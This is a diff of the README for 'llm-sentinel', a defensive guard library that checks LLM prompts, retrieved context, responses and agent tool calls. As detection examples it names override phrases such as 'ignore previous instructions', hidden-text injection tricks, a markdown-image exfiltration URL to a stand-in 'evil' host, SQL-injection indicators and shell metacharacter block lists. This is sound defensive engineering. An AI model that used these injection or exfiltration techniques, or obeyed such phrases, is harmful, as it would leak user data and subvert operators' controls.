@@ -2,324 +2,149 @@
 
 [![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![transformers](https://img.shields.io/badge/transformers-%E2%89%A54.40-orange.svg)](https://github.com/huggingface/transformers)
+[![OWASP LLM Top 10 (2025)](https://img.shields.io/badge/OWASP%20LLM%20Top%2010-orange.svg)](OWASP_MAPPING.md)
 
-**llm-sentinel** is a defense-in-depth input and output guard for LLM applications — stopping prompt injection, jailbreaks, PII exposure, and harmful model responses before they reach your users.
+Defense-in-depth security for LLM applications. `llm-sentinel` checks prompts, retrieved context, model responses, and agent tool calls before they cross a trust boundary.
 
----
+It is an in-process Python SDK with no server or network hop.
 
-## Table of Contents
+## What it protects
 
-- [What is llm-sentinel?](#what-is-llm-sentinel)
-- [Key Features](#key-features)
-- [System Architecture](#system-architecture)
-- [Quick Start](#quick-start)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-  - [Configuration](#configuration)
-  - [Run your first check](#run-your-first-check)
-- [SDK Reference](#sdk-reference)
-  - [Guard](#guard)
-  - [check\_input](#guardcheck_input)
-  - [check\_output](#guardcheck_output)
-  - [Exceptions](#exceptions)
-- [Input Pipeline](#input-pipeline)
-- [Output Pipeline](#output-pipeline)
-- [Identity and Roles](#identity-and-roles)
-- [REST gateway](#rest-gateway)
-- [Configuration Reference](#configuration-reference)
-- [OWASP LLM Top 10 coverage](OWASP_MAPPING.md)
-- [Test](#test)
-- [Model supply chain](#model-supply-chain-owasp-llm03)
-- [Project Layout](#project-layout)
-- [Audit Log](#audit-log)
-- [Performance](#performance)
-- [Roadmap](#roadmap)
+- Direct and indirect prompt injection
+- Secrets and PII in prompts and responses
+- System-prompt leakage
+- Unsafe HTML, links, images, and SQL-like output
+- Excessive agent/tool permissions
+- Unbounded request and token consumption
+- Harmful model responses
+- OWASP LLM Top 10 coverage — see the [OWASP coverage map](OWASP_MAPPING.md) for what is covered, partial, or out of scope
 
----
+Every check returns one of:
 
-## What is llm-sentinel?
+| Verdict | Meaning |
+|---|---|
+| `allow` | Safe to continue, using the sanitized value when provided |
+| `review` | Hold for an operator or application-specific review |
+| `block` | Do not pass the value to the next stage |
 
-Prompt injection, jailbreaks, secret leakage, PII exposure, and harmful model responses are constant threats for any product built on an LLM. llm-sentinel sits between your code and your model — it runs every incoming prompt and outgoing response through layered pipelines of cheap deterministic checks followed by ML-based classification and configurable per-application policy enforcement.
+Unavailable classifiers fail closed to `review` rather than silently allowing content.
 
-It is an **in-process Python SDK** (`from sentinel import Guard`); an optional REST sidecar for non-Python stacks is the separate [llm-sentry-gateway](../llm-sentry-gateway) project. Models load lazily on the first call and are cached for the lifetime of the `Guard` instance. The design is fail-safe throughout: an unavailable classifier returns `review`, never `allow`.
+For detailed OWASP coverage and limitations, see [OWASP_MAPPING.md](OWASP_MAPPING.md).
 
----
+## Architecture
 
-## Key Features
-
-### Defense-in-depth pipeline
-Every prompt passes normalization → rule checks → Prompt Guard 2 classifier → per-application policy, in that order. Each stage short-circuits on `block`, so expensive ML stages only run when cheap deterministic ones pass. The same layered model applies in reverse to model responses.
-
-### Fail-safe by design
-An unavailable classifier or PII detector never silently passes through. It returns `review`, flagging the request for human oversight rather than allowing potentially dangerous content.
-
-### Per-application policies
-Applications declare allowed capabilities, blocked topics, and PII handling in YAML files — no code changes required. Per-role overrides let privileged users access additional capabilities. The same policy file governs both input and output checks.
-
-### In-process SDK
-`Guard` works directly in any Python application with no server or network hop. For Node.js, Go, Ruby, or any other stack, use the [llm-sentry-gateway](../llm-sentry-gateway) HTTP sidecar, which wraps this SDK.
-
-### SHA-256 hash-only audit log
-Every check writes a JSON audit line to stdout. Content is never logged — only the SHA-256 hash. Pipe stdout to your log aggregator to retain audit trails without storing sensitive user input.
-
-### Offline after first pull
-All models run locally via `transformers`. After the initial download they are cached with `local_files_only=True` — no outbound calls during inference.
-
----
-
-## System Architecture
-
-```
+```text
 your code ─▶ Guard (in-process)
   │
-  │  every check first charges the per-caller rate limit and token budget
+  │  every check applies the configured per-caller limits
   │
   ├─▶ guard.check_input(prompt)
   │       ├─ 1. Normalization    (NFC, zero-width strips, HTML decode, whitespace)
   │       ├─ 2. Rule checks      (injection phrases, fake delimiters, secrets, blobs)
-  │       ├─ 3. Classifier       (Prompt Guard 2, 86M — local, chunked scoring)
+  │       ├─ 3. Classifier       (Prompt Guard 2, local, chunked scoring)
   │       └─ 4. Policy           (capabilities, topics, PII per application)
-  │                ▼ verdict: allow | review | block    result.sanitized_prompt
+  │                ▼ allow | review | block
   │
   ├─▶ guard.check_context(document, source=...)
-  │   retrieved pages, emails, tool results — before the model reads them
-  │       ├─ 1. Hidden content   (Unicode tag chars decoded, invisible runs, CSS-hidden)
-  │       ├─ 2. Normalization
-  │       ├─ 3. Rule checks      (context pack: "addressed to the AI", "new instructions")
-  │       └─ 4. Classifier       (Prompt Guard 2, larger chunk cap)
-  │       guard.wrap_untrusted(...) fences surviving content for the prompt
+  │   retrieved pages, emails, and tool results — before the model reads them
+  │       ├─ hidden-content scan + normalization
+  │       ├─ context rules + Prompt Guard 2
+  │       └─ guard.wrap_untrusted(...) fences surviving content
   │
-  ├─▶ [your LLM call]
+  ├─▶ [your LLM / agent call]
   │
   ├─▶ guard.check_output(response, prompt=..., system_prompt=..., canaries=[...])
-  │       ├─ 1. Normalization
-  │       ├─ 2. Rule checks      (known key formats, leakage patterns)
-  │       ├─ 3. Leakage          (canary tokens + semantic similarity)
-  │       ├─ 4. Output handling  (secrets/entropy, SQL, images, links, HTML)
-  │       ├─ 5. Policy           (topics, PII redaction per application)
-  │       └─ 6. Safety           (Llama Guard 3-1B — safe/unsafe + hazards)
-  │                ▼ verdict: allow | review | block    out.sanitized_output
+  │       ├─ leakage checks       (rules, canaries, semantic similarity)
+  │       ├─ output handling      (secrets, SQL, images, links, HTML)
+  │       ├─ application policy   (topics and PII redaction)
+  │       └─ safety classifier    (Llama Guard)
+  │                ▼ allow | review | block
   │
   └─▶ guard.check_tool_call(tool, arguments, ...)
-          deny-by-default policy: tool allowlist → per-argument type / path / URL
-          (SSRF) / SQL / shell checks → secrets in arguments → confirm ⇒ review
-                   ▼ verdict: allow | review | block
+          deny-by-default allowlist → typed arguments → path/URL/SQL/shell checks
+                   ▼ allow | review | block
 
-Model loading: revision pins, optional SENTINEL_REQUIRE_PINNED_MODELS,
-no trust_remote_code. Any unavailable model ⇒ its stage reports `review`, never `allow`.
+Models are local, revision-pinnable, and loaded without remote code execution.
 ```
 
-Every pipeline is fail-safe: a blocked stage returns `block`, an uncertain or unavailable stage returns `review`, and only a fully passing pipeline returns `allow`.
-
-| Goal | How it's achieved |
-|------|-------------------|
-| Stop prompt injection before it reaches the model | Rule engine + Prompt Guard 2 classifier |
-| Catch jailbreaks that evade simple pattern matching | ML classifier with overlapping-chunk scoring for long prompts |
-| Prevent secret leakage in prompts and responses | Regex rule packs for known key formats, plus entropy heuristics for the rest |
-| Detect harmful content in model responses | Llama Guard 3-1B content-safety classifier (14 hazard categories) |
-| Catch system-prompt disclosure in responses | Leakage patterns, canary tokens, semantic similarity |
-| Stop injected instructions in retrieved content | `check_context`: hidden-text decoding, context rules, classifier, spotlighting |
-| Neutralize dangerous model output | Output handling: HTML sanitizing, image/link control, SQL indicators |
-| Keep agents from over-reaching | `check_tool_call`: deny-by-default tool and argument policy |
-| Bound resource use per caller | Rate limit and token budget |
-| Redact PII in prompts and responses | Dual-model PII detector (piiranha + bert-base-NER) |
-| Let applications define their own capability and topic policies | Per-application YAML policy files |
-| Never log sensitive content | SHA-256 hash-only audit log to stdout |
-| Work offline after first model pull | `local_files_only=True` on all model loads |
-| Fast unit tests (< 1s) | Classifier and PII disable flags; no ML loaded in CI |
-
----
-
-## Quick Start
-
-### Prerequisites
-
-- **Python 3.11+**
-- For ML inference: a machine with ~3 GB free disk space for model weights
-- Gated Hugging Face models require `huggingface-cli login` (or use the ungated mirrors listed under [Installation](#installation))
-
-### Installation
+## Install
 
 ```bash
-# Rules + normalization only (no ML models — policy-only or CI use)
-pip install -e "."
+# Core package: rules, normalization, policies, and SDK
+pip install -e .
 
-# With local ML inference (all classifiers + PII detector)
+# Local ML classifiers and PII detection
 pip install -e ".[ml]"
+
+# Development and security tooling
+pip install -e ".[dev]"
+pip install -e ".[security]"
 ```
 
-**Gated models on Hugging Face:**
+Models download on first use and are cached locally. Prompt injection classification and output safety use **gated Meta models** (Llama Prompt Guard 2 and Llama Guard 3): request access on Hugging Face and log in before first use, or those checks return `review` for every request. See **[MODELS.md](MODELS.md)** for the full model list, access steps, pre-downloading, revision pinning, and what happens when a model is unavailable.
 
-- `meta-llama/Llama-Prompt-Guard-2-86M` — request access and run `huggingface-cli login`, or set `SENTINEL_CLASSIFIER_MODEL=gravitee-io/Llama-Prompt-Guard-2-86M-onnx` (ungated mirror)
-- `meta-llama/Llama-Guard-3-1B` — request access similarly, or point `SENTINEL_SAFETY_MODEL` at an ungated mirror
-
-Models are downloaded on first run (~350 MB for Prompt Guard 2, ~2 GB for Llama Guard 3-1B) and cached locally.
-
-### Configuration
-
-All settings are read from environment variables (or a `.env` file) with the `SENTINEL_` prefix. No config file is required for a default setup. See the full [Configuration Reference](#configuration-reference) for all options.
-
-```bash
-# Optional: use ungated model mirrors
-export SENTINEL_CLASSIFIER_MODEL=gravitee-io/Llama-Prompt-Guard-2-86M-onnx
-```
-
-Policy files live in a `policies/` directory by default. Each file is named after the `application_id` it governs. See [`policies/support-bot.yaml`](policies/support-bot.yaml) for a full example.
-
-### Run your first check
+## Quick start
 
 ```python
 from sentinel import Guard
 
-guard = Guard.from_policy("policies")          # directory of per-app policy YAML files
+guard = Guard.from_policy("policies")
 
-# Check the user's prompt before it reaches the model
-result = guard.check_input(prompt, user_id="u123", application_id="support-bot")
-if result.verdict == "block":
-    return "I can't help with that."
-
-# Pass result.sanitized_prompt to your LLM, then vet the response
-llm_response = my_llm(result.sanitized_prompt)
-out = guard.check_output(llm_response, prompt=prompt, application_id="support-bot")
-if out.verdict != "block":
-    return out.sanitized_output
-```
-
-No server required. Models load lazily on the first call.
-
----
-
-## SDK Reference
-
-### `Guard`
-
-```python
-from sentinel import Guard, PromptBlocked, OutputBlocked
-
-# Default — no policy, runs normalization + rules + classifier only
-guard = Guard()
-
-# Scoped to a policy directory
-guard = Guard.from_policy("policies/")
-
-# Custom IAM (see Identity and roles below)
-guard = Guard(policy_dir="policies/", identity_provider=MyOktaProvider())
-
-# Eagerly load all models at startup instead of on first call
-guard.load()
-```
-
-### `guard.check_input`
-
-```python
-result = guard.check_input(
-    prompt,
-    application_id="support-bot",   # enables policy evaluation
-    user_id="u123",                  # resolved to roles via identity provider
-    capabilities=["web_search"],     # capabilities the user is requesting
-    threshold_medium=0.50,           # classifier score → review (default from env)
-    threshold_high=0.90,             # classifier score → block (default from env)
-    raise_on_block=False,            # raise PromptBlocked instead of returning
-)
-
-result.verdict          # "allow" | "review" | "block"
-result.sanitized_prompt # normalized + PII-redacted text (None when blocked)
-result.blocked_at       # "rule_checks" | "classifier" | "policy" | None
-result.risk_score       # classifier score (None when not applicable)
-result.pipeline         # full per-stage detail
-```
-
-### `guard.check_output`
-
-```python
-out = guard.check_output(
-    llm_response,
-    prompt=original_prompt,          # improves Llama Guard accuracy
+incoming = guard.check_input(
+    user_prompt,
     application_id="support-bot",
-    system_prompt=SYSTEM_PROMPT,     # optional: block responses that leak it (LLM07)
-    canaries=[canary],               # optional: block responses containing a canary
-    raise_on_block=False,
+    user_id="u123",
+    capabilities=["web_search"],
 )
+if incoming.verdict != "allow":
+    raise RuntimeError(f"input requires review: {incoming.verdict}")
 
-out.verdict           # "allow" | "review" | "block"
-out.sanitized_output  # normalized + PII-redacted text (None when blocked)
-out.blocked_at        # "rule_checks" | "leakage" | "output_handling" | "policy" | "safety" | None
-out.safety_categories # hazard categories that caused a block, e.g. ["violent_crimes"]
-out.pipeline          # full per-stage detail
-```
-
-#### System-prompt leakage (OWASP LLM07)
-
-Two optional, deterministic checks. Neither the prompt nor the canary is ever logged or returned.
-
-```python
-# 1. Canary: plant a random marker in the system prompt. It has no legitimate
-#    reason to appear in a response, so any appearance means extraction.
-system_prompt, canary = Guard.with_canary("You are SupportBot. ...")
-reply = my_llm(system_prompt, user_prompt)
-out = guard.check_output(reply, canaries=[canary])   # blocked_at == "leakage"
-
-# 2. Semantic similarity with the real system prompt (see below) — on by
-#    default when system_prompt is given.
-out = guard.check_output(reply, system_prompt=system_prompt)
-out = guard.check_output(reply, system_prompt=system_prompt, semantic_leak=False)  # off for this call
-```
-
-**Semantic similarity (optional).** When `system_prompt` is supplied and no canary fired, the prompt and response are split into sentences, embedded with a sentence-embedding model, and compared by cosine similarity. A response sentence at or above `SENTINEL_SEMANTIC_LEAK_THRESHOLD` (default `0.80`) blocks with `system_prompt_semantic` — this catches verbatim dumps, paraphrases and, with the default multilingual model, translations. **Not detected:** re-encoding (base64, ROT13, one character per line) of the prompt, unless a canary survives it — use as one layer. `system_prompt` is used only by this check, so with it turned off only canaries protect you.
-
-- **Turn it off:** globally with `SENTINEL_DISABLE_SEMANTIC_LEAK=true`, or per call with `semantic_leak=False` (gateway: `"semantic_leak": false`). `semantic_leak=True` forces it on when globally disabled.
-- **Lazy:** the model loads on the first call that supplies a system prompt, never at startup, and never when no system prompt is passed. It needs the `ml` extra (`pip install .[ml]`); the first use downloads about 470 MB.
-- **Fail-safe:** if it is enabled but the model can't load (or the text exceeds `SENTINEL_SEMANTIC_LEAK_MAX_SEGMENTS`), the verdict is `review`, not `allow`. Turn it off if you'd rather skip silently.
-- **Tuning:** a reply that legitimately mentions a rule ("I can't help with refunds that large") can score near the rule. Raise the threshold if you see false positives, and watch `pipeline.leakage.semantic_similarity` (returned even when it passes) to choose a value.
-- **Privacy:** only sentence embeddings, keyed by a hash of the prompt, are cached in memory; the prompt text is not retained.
-
-### Untrusted content (OWASP LLM01 — indirect prompt injection)
-
-Retrieved documents, web pages, emails and tool results are *data*, but the model reads them next to its instructions. Vet each one **before** it reaches the model:
-
-```python
-from sentinel import ContextBlocked
-
-for doc in retrieved_chunks:
-    r = guard.check_context(doc.text, source="retrieval", application_id="support-bot")
-    if r.verdict == "allow":
-        context.append(Guard.wrap_untrusted(r.sanitized_content, "retrieval"))
-    # "block" -> drop it; "review" -> quarantine / hold for a human
-
-system_prompt += "\n" + Guard.UNTRUSTED_CONTENT_NOTICE
-```
-
-| Check | Catches |
-|-------|---------|
-| Hidden content | ASCII smuggled in invisible Unicode tag characters (decoded, scanned, then stripped), long runs of zero-width characters, CSS-hidden text (`display:none`, `font-size:0`, white-on-white) → at least `review` |
-| Rules | The input injection/delimiter patterns, now also **multilingual** (es, fr, de, pt, it, ru, zh, ja, ko "ignore previous instructions"), plus `rules/context.yaml`: text addressed to the AI, "when you summarize this…", "new instructions:", "don't tell the user", exfiltration directives, tool-call commands → `block` |
-| Classifier | Prompt Guard 2 over the whole document (up to `SENTINEL_CONTEXT_CLASSIFIER_MAX_CHUNKS`); too long to score, or classifier unavailable → `review`, never `allow` |
-
-`Guard.wrap_untrusted` fences content in `<untrusted_content id="…">` tags with a random id, so a document cannot forge the closing tag. Gateway: `POST /v1/context/check` with `{"content", "source", "context", "options"}`.
-
-**Limits:** this reduces risk; it cannot make untrusted text trustworthy. Multilingual coverage is the "ignore previous instructions" family only; other phrasings in other languages rely on the classifier. Retrieved HTML with `display:none` (e.g. email preheaders) is flagged for review — strip markup first if that is noisy. Not rate limited (RAG calls it per chunk); content over `SENTINEL_MAX_CONTEXT_LENGTH` must be chunked first. Pair it with `check_tool_call` and least-privilege tools.
-
-### Tool calls (OWASP LLM06)
-
-If your model can call tools, its output is a command. Validate each call **before** the agent runs it:
-
-```python
-from sentinel import ToolBlocked
-
-r = guard.check_tool_call(
-    "read_doc", {"path": model_args["path"]},
-    application_id="support-bot", user_id=user_id,
+response = my_llm(incoming.sanitized_prompt)
+outgoing = guard.check_output(
+    response,
+    prompt=user_prompt,
+    application_id="support-bot",
 )
-if r.verdict == "block":      # r.violations e.g. ["arg_path:path"]
-    ...
-elif r.verdict == "review":   # valid, but the policy wants a human to approve it
-    ...                       # r.requires_confirmation is True
+if outgoing.verdict != "allow":
+    raise RuntimeError(f"output requires review: {outgoing.verdict}")
+
+print(outgoing.sanitized_output)
 ```
 
-It is **deny-by-default** against the policy's `tools:` section, and a call with no `application_id` (or no policy) is always blocked.
+Models load lazily. Use `guard.load()` during application startup if you prefer eager loading.
+
+## Examples
+
+The [`examples/`](examples/) directory keeps workflows separate and runnable:
+
+| Example | Demonstrates |
+|---|---|
+| [`basic_usage.py`](examples/basic_usage.py) | Input and output guard loop with policy and PII redaction |
+| [`context_and_tools.py`](examples/context_and_tools.py) | Indirect-injection checks, untrusted-content fencing, and tool authorization |
+| [`system_prompt_canary.py`](examples/system_prompt_canary.py) | Canary-based system-prompt leakage detection |
+
+Each example uses the local SDK; none requires a REST service.
+
+## Policies
+
+Policies are YAML files in `policies/`, selected by `application_id`. See [`policies/support-bot.yaml`](policies/support-bot.yaml) for the complete example.
 
 ```yaml
+id: support-bot
+
+capabilities:
+  allowed: [web_search, kb_lookup]
+  blocked: [code_execution, file_write]
+
+topics:
+  blocked:
+    - id: medical_advice
+      keywords: [diagnosis, prescription, dosage]
+
+pii:
+  action: redact       # block | redact | flag
+  entities: [EMAIL, PHONE, PERSON, ADDRESS]
+
 tools:
   allowed:
     search_kb:
@@ -328,454 +153,78 @@ tools:
     read_doc:
       args:
         path: {kind: path, roots: [/srv/docs], required: true}
-    send_email:
-      confirm: true            # valid calls return `review`
-      args:
-        to: {pattern: '[^@\s]+@acme\.com', required: true}
 ```
 
-| Check | Blocks |
-|-------|--------|
-| Tool / arguments | Unlisted tools, undeclared arguments, missing required ones, wrong type, oversized (`max_length`, `minimum`/`maximum`, `enum`, `pattern` — full match) |
-| `kind: path` | Relative paths, `..` (also percent-encoded), anything outside `roots` |
-| `kind: url` | Non-http(s), embedded credentials, loopback / private / link-local / cloud-metadata hosts, numeric-obfuscated IPs, hosts outside `allowed_domains` |
-| `kind: sql` | Anything the [SQL indicators](#stage-2c--output-handling-owasp-llm05) flag; read-only by default (`readonly: false` allows writes, still blocks destructive SQL) |
-| `kind: shell` | Shell metacharacters (`; & \| \` $ < > ( ) { } \` and newlines) |
-| Secrets | Known key formats, and high-entropy values in free-text arguments (skipped for arguments pinned by `pattern` or `enum`) |
-
-Violations name the argument, never its value. A role's own `tools:` section replaces the default one (like capabilities). Gateway: `POST /v1/tools/check` with `{"tool", "arguments", "context": {"application_id", "user_id"}}`. Calls count against the same rate limit as the other checks.
-
-**Limits:** this validates what the model *asked for*. It cannot see symlinks, DNS rebinding, or what the tool does internally. Keep least privilege at the tool itself (scoped credentials, `subprocess` without `shell=True`, parameterized queries).
-
-### Exceptions
-
-```python
-from sentinel import PromptBlocked, OutputBlocked, ToolBlocked, ContextBlocked
-
-try:
-    result = guard.check_input(prompt, raise_on_block=True)
-except PromptBlocked as e:
-    e.blocked_at   # stage that blocked it
-    e.violations   # rule violation ids, if applicable
-    e.result       # the full AnalyzeResponse
-
-try:
-    out = guard.check_output(response, raise_on_block=True)
-except OutputBlocked as e:
-    e.blocked_at         # stage that blocked it
-    e.safety_categories  # Llama Guard hazard codes, if applicable
-    e.result             # the full OutputAnalyzeResponse
-
-try:
-    guard.check_tool_call(tool, args, application_id=app_id, raise_on_block=True)
-except ToolBlocked as e:
-    e.tool, e.violations  # e.g. "read_doc", ["arg_path:path"]
-```
-
----
-
-## Input Pipeline
-
-### Stage 1 — Normalization
-
-Canonicalizes the text so later stages see a consistent representation regardless of encoding tricks:
-
-- Unicode NFC normalization
-- Strip invisible/zero-width/bidi-override characters (U+200B–U+202E, U+FEFF, etc.)
-- Single-pass HTML entity decode (one round only, so `&amp;lt;` doesn't become `<`)
-- Collapse excessive whitespace/newline runs
-- Trim leading/trailing whitespace
-
-`sanitized_prompt` in the result is always the normalized (and potentially PII-redacted) version, never the raw input.
-
-### Stage 2 — Rule checks
-
-A YAML rule pack (`sentinel/rules/default.yaml`) defines regex pattern categories:
-
-| Category | Examples |
-|----------|----------|
-| `injection_patterns` | role override phrases (also "ignore previous instructions" in 9 languages besides English), "reveal system prompt", jailbreak markers |
-| `delimiter_patterns` | fake `[SYSTEM]` / `<\|im_start\|>` tokens, chat template injections |
-| `secret_patterns` | OpenAI/Anthropic/Google/Stripe/Slack/GitLab/GitHub/npm/Hugging Face/SendGrid keys, AWS access keys, JWTs, credentials in URLs, PEM private keys |
-
-A base64/hex ratio heuristic catches obfuscated payloads: if more than 40% of the prompt is base64-like blobs (≥ 40 chars each), it's flagged.
-
-Any match produces a `block` with a `violations` list. Add patterns under any category — no code changes required.
-
-### Stage 3 — Classifier
-
-[Meta Llama Prompt Guard 2 (86M)](https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M) runs locally via `transformers`. The model's context window is 512 tokens; prompts longer than that are scored in overlapping 128-token-stride chunks so an attacker can't hide a payload past the truncation boundary.
-
-The malicious label ID is resolved from `model.config.label2id` at startup — the classifier fails safe if the model has no recognizable label rather than silently scoring everything benign.
-
-**Verdicts from score thresholds:**
-
-| Score | Verdict |
-|-------|---------|
-| `< medium` (default 0.50) | `allow` |
-| `medium ≤ score < high` (default 0.90) | `review` |
-| `≥ high` | `block` |
-
-### Stage 4 — Policy (per application)
-
-The policy stage runs only when `application_id` is supplied. It evaluates three sub-checks in order — policy can only **downgrade** the verdict (`allow` → `review` → `block`), never upgrade it.
-
-**Capabilities** — applications declare which capabilities are allowed or blocked. Users requesting a capability not in the allowed list are blocked. Per-role overrides let privileged users access additional capabilities.
-
-```yaml
-# policies/my-app.yaml
-capabilities:
-  allowed: [web_search, kb_lookup]
-  blocked: [code_execution, file_write]
-roles:
-  admin:
-    capabilities:
-      allowed: [web_search, kb_lookup, code_execution]
-```
-
-**Topic blocking** — keyword lists gate topics at the application level.
-
-```yaml
-topics:
-  blocked:
-    - id: medical_advice
-      keywords: [diagnosis, prescription, dosage]
-```
-
-**PII detection and redaction** — two models run in tandem:
-
-| Model | Strength |
-|-------|----------|
-| [`iiiorg/piiranha-v1-detect-personal-information`](https://huggingface.co/iiiorg/piiranha-v1-detect-personal-information) | Structured PII: emails, phones, SSNs, credit cards, addresses, IDs |
-| [`dslim/bert-base-NER`](https://huggingface.co/dslim/bert-base-NER) | Person names and locations in prose (PER + LOC groups only) |
-
-Spans from both models are merged, de-overlapped, and snapped to word boundaries. The policy action is configured per application:
-
-```yaml
-pii:
-  action: redact      # block | redact | flag
-  entities: [EMAIL, PHONE, SSN, CREDIT_CARD, PERSON, ADDRESS]
-```
-
-`redact` replaces entities with stable placeholders (`[EMAIL_1]`, `[PERSON_1]`, …) — the same value maps to the same placeholder within one prompt, so the LLM can still refer to redacted values coherently.
-
----
-
-## Output Pipeline
-
-### Threat model
-
-| Threat | Caught by |
-|--------|-----------|
-| Exfiltration images/links, `<script>` / event-handler HTML, `javascript:` URLs in a response | Output handling stage (parser-verified; per-app `output:` policy) |
-| Model discloses its system prompt / hidden instructions | Output rule pack (`leak_patterns`); optional canary + semantic system-prompt check (`leakage`) |
-| Credentials or API keys in a response | Output rule pack (`secret_patterns`) for known formats; entropy scan (`secrets:`) for the rest |
-| Raw chat-template tokens leaking into output | Output rule pack (`leak_patterns`) |
-| Harmful content (violence, CSAM, weapons, self-harm, …) | Llama Guard 3-1B (14 hazard categories) |
-| Blocked topics appearing in responses | Per-application policy (topics) |
-| PII exposure to end users | Per-application policy (PII detect → block/redact/flag) |
-
-### Stage 2 — Output rule checks
-
-`sentinel/rules/output.yaml` defines two categories:
-
-| Category | Patterns |
-|----------|----------|
-| `leak_patterns` | `system_prompt_disclosure`, `instruction_recital`, `chat_template_tokens` |
-| `secret_patterns` | Same key formats as the input pack |
-
-### Stage 2b — Leakage check (optional)
-
-Runs after rule checks when the caller supplies `system_prompt` and/or `canaries` (SDK arguments, or fields on the gateway's `POST /v1/output/analyze`). Blocks with `blocked_at: "leakage"` and violations `canary_leaked` or `system_prompt_semantic`. See [System-prompt leakage](#system-prompt-leakage-owasp-llm07).
-
-### Stage 2c — Output handling (OWASP LLM05)
-
-A model response is untrusted input to whatever consumes it next. This stage neutralizes the constructs that turn a response into an attack, according to the application's policy. It runs by default (turn it off with `SENTINEL_DISABLE_OUTPUT_HANDLING=true`) and later stages judge the neutralized text.
-
-| Threat | Default | Modes |
-|--------|---------|-------|
-| Markdown images — `![x](https://evil/?d=SECRET)` is fetched by the renderer on its own: a silent exfiltration channel | `strip` | `allow` · `allowlist` · `strip` · `block` |
-| Markdown links, autolinks, bare URLs — phishing, exfiltration | `allow` | `allow` · `allowlist` · `strip` · `block` |
-| Raw HTML — `<script>`, event handlers, `<iframe>` | `sanitize` | `allow` · `sanitize` · `block` |
-| `javascript:` / `data:` / `vbscript:` URLs | always stripped | — |
-| SQL-injection indicators (stacked or destructive statements, `OR 1=1`, `UNION SELECT`, …) | `allow` (opt-in) | `allow` · `flag` · `block` · `readonly` |
-
-```yaml
-# policies/support-bot.yaml
-output:
-  images: strip            # or allowlist, with allowed_domains
-  links: allowlist
-  allowed_domains: [docs.acme.com]   # subdomains match too
-  html: sanitize           # coding assistants: html: allow
-  sql: readonly            # text-to-SQL apps: single read-only query only
-  secrets: redact          # unknown-format secrets: allow | flag (default) | redact | block
-```
-
-Global defaults come from `SENTINEL_OUTPUT_IMAGES`, `SENTINEL_OUTPUT_LINKS`, `SENTINEL_OUTPUT_HTML` and `SENTINEL_OUTPUT_ALLOWED_DOMAINS`; a policy file's `output:` section overrides them per application. `strip` keeps the link text or image alt text and removes the URL. A response that is changed still gets verdict `allow` with the cleaned text in `sanitized_output`; `block` mode returns `blocked_at: "output_handling"`. Report: `pipeline.output_handling` (`findings`, `actions`).
-
-How it works: markdown is *detected* with a CommonMark parser ([markdown-it-py](https://github.com/executablebooks/markdown-it-py)) plus a raw-syntax pass (parsers silently drop `javascript:` links that other renderers might not), *rewritten* conservatively, then **re-parsed to verify** — if anything disallowed survives, the response is blocked (fail closed). HTML is sanitized by [nh3](https://github.com/messense/nh3), never by hand. Relative URLs count as same-origin in `allowlist` mode.
-
-**Limits.** This reduces risk; it does not replace encoding at the sink (parameterized queries, HTML escaping, no `shell=True`). Fenced and inline code is left alone for markdown images/links, but is **not** exempt from HTML scanning — set `html: allow` for apps that emit code. With `html: allow`, `images`/`links` apply to markdown only, not raw `<img>`/`<a>`. When HTML is present, the text is re-serialized by the sanitizer, which escapes stray `&`, `<`, `>`. Shell-injection patterns are not detected (yet).
-
-**SQL.** Opt-in, because ordinary answers contain SQL. For apps that execute or interpolate model output into a query (text-to-SQL, database agents), set `sql` to `flag` (verdict `review`), `block`, or `readonly` (block, and also refuse any `INSERT`/`UPDATE`/`DELETE`/DDL). Statements are split with [sqlparse](https://github.com/andialbrecht/sqlparse) — a `;` inside a string or comment isn't a boundary — and classified by shape, so prose like "Update the settings" isn't SQL. Indicators (reported in `pipeline.output_handling.sql_indicators`): `sql_stacked_statements`, `sql_destructive` (DROP/TRUNCATE/ALTER/CREATE/GRANT/REVOKE), `sql_unbounded_write` (UPDATE/DELETE without WHERE), `sql_write_statement` (`readonly` only), `sql_tautology`, `sql_union_select`, `sql_comment_truncation`, `sql_time_delay`, `sql_file_or_exec`. SQL is detected, never rewritten. Statements are recognized at the start of a line, code fence or inline code span (a `DROP TABLE` buried mid-sentence is not), and a prose line like "Delete from the menu what you dislike." can false-positive. It is heuristic, not a SQL validator, and explanatory answers with SQL examples will trip it — use it only on apps whose output reaches a database, and keep parameterized queries and a read-only DB role as the real defense.
-
-### Stage 3 — Policy (output)
-
-The same per-application YAML drives both directions. For outputs, only **topics** and **PII** apply — capability checks are a request-time concern. PII redaction lands in `sanitized_output`.
-
-Policy runs **before** the safety classifier so Llama Guard judges the sanitized text (what would actually be shown to the user). When a policy declares PII handling, S7 (privacy) is excluded from Llama Guard enforcement for that request — Llama Guard otherwise flags even redacted `[EMAIL_1]`-style placeholders.
-
-### Stage 4 — Llama Guard 3 safety classifier
-
-[Llama Guard 3-1B](https://huggingface.co/meta-llama/Llama-Guard-3-1B) generates a content-safety verdict on the sanitized output. Unlike Prompt Guard (an encoder that emits a probability), Llama Guard is a causal LM that generates `safe` or `unsafe\nS1,S9`. There are no thresholds — the verdict is binary.
-
-**MLCommons hazard taxonomy (S1–S14):**
-
-| Code | Category |
-|------|----------|
-| S1 | violent_crimes |
-| S2 | non_violent_crimes |
-| S3 | sex_related_crimes |
-| S4 | child_sexual_exploitation |
-| S5 | defamation |
-| S6 | specialized_advice |
-| S7 | privacy |
-| S8 | intellectual_property |
-| S9 | indiscriminate_weapons |
-| S10 | hate |
-| S11 | suicide_and_self_harm |
-| S12 | sexual_content |
-| S13 | elections |
-| S14 | code_interpreter_abuse |
-
-Passing the original `prompt` alongside the `output` is optional but recommended — Llama Guard judges responses in context, and the same answer can be safe or unsafe depending on the question asked.
-
-`SENTINEL_SAFETY_EXCLUDED_CATEGORIES` (e.g. `S6,S13`) excludes specific categories from enforcement. Exclusion filters the verdict, not the prompt — if everything the model flagged is excluded the result is `safe` with a note; if anything else was also flagged the block stands.
-
----
-
-## Identity and Roles
-
-llm-sentinel does **not** manage users. It resolves a `user_id` into roles via the `IdentityProvider` protocol — you supply an implementation backed by your IAM:
-
-```python
-from sentinel.identity import Identity, IdentityProvider
-from sentinel import Guard
-
-class OktaIdentityProvider:
-    def resolve(self, user_id: str) -> Identity:
-        profile = my_okta_client.get_user(user_id)
-        return Identity(user_id=user_id, roles=profile.roles)
-
